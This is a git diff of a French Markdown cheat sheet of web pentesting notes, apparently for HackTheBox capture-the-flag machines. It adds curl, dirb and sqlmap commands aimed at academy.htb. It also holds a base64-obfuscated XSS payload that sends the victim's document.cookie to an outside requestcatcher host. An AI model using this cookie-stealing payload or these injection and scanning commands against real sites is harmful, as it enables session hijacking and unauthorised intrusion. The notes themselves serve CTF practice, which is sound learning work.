@@ -1,14 +1,21 @@
 # Web
 
+## API
+
+Outil pour requêter une API : https://reqbin.com
+
+## Curl
+
+```bash
+# ajouter un header à la requête
+curl http://10.10.10.215 -H host:academy.htb
+```
+
 ## Obfuscation Javascript
 
 Outil pour obfusquer du Javascript : http://dean.edwards.name/packer
 
 Outil pour dé-obfusquer du Javascript : https://lelinhtinh.github.io/de4js
-
-## API
-
-Outil pour requêter une API : https://reqbin.com
 
 ## XSS
 
@@ -33,9 +40,23 @@ document.body.appendChild(script);
 <body onload="eval(atob('dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdC5zcmMgPSAiaHR0cHM6Ly9idXN0ZXJiYXh0ZXIucmVxdWVzdGNhdGNoZXIuY29tLyIgKyBkb2N1bWVudC5jb29raWU7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOw=='))">
 ```
 
+## Scan d'URL web
+
+>Attention ! Ne pas utiliser en CTF réaliste
+```bash
+dirb http://10.10.10.215 -r -o academy.dirb.txt -H host:academy.htb
+```
+
 ## Injection SQL
 
 https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet
+
+```bash
+# à partir d'une url
+sqlmap -u "http://academy.htb/admin.php?uid=0&password=0" #--level 5 --risk 3
+# à partir d'une requête interceptée par burpsuite
+sqlmap -r academy.burp.txt
+```
 
 ## TLS
 
